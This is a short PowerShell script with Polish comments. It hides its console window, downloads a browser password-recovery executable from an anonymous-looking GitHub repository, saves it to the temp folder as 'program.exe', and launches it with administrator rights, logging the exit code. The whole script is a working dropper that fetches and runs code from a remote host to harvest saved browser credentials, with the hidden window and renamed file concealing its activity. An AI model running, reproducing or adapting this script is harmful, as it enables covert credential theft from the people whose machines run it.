# Minimalizuj okno
$null = (Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindowAsync' -Namespace Win32Functions -PassThru)::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle), 0)

# Pobierz i uruchom aplikację
$exeUrl = "https://github.com/dfassdaopiju/XzxX/blob/main/WebBrowserPassView.exe"
$exePath = "$env:TEMP\program.exe"

try {
    # Pobierz plik
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    
    # Uruchom jako administrator
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exePath
    $psi.Verb = "runas"
    $psi.UseShellExecute = $true
    $process = [System.Diagnostics.Process]::Start($psi)
    
    # Czekaj na zakończenie i zwróć wynik
    $process.WaitForExit()
    $exitCode = $process.ExitCode
    
    # Zapisz wynik do pliku
    "ExitCode: $exitCode" | Out-File "$env:TEMP\app_result.txt"
    
    # Komunikat sukcesu
    if ($exitCode -eq 0) {
        [System.Windows.Forms.MessageBox]::Show("Aplikacja wykonana pomyślnie (kod: $exitCode)", "Sukces", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
    } else {
        [System.Windows.Forms.MessageBox]::Show("Aplikacja zakończona kodem błędu: $exitCode", "Ostrzeżenie", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
    }
}
catch {
    $errorMsg = $_.Exception.Message
    [System.Windows.Forms.MessageBox]::Show("BŁAD: $errorMsg", "Krytyczny Błąd", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    $errorMsg | Out-File "$env:TEMP\app_error.txt"
}
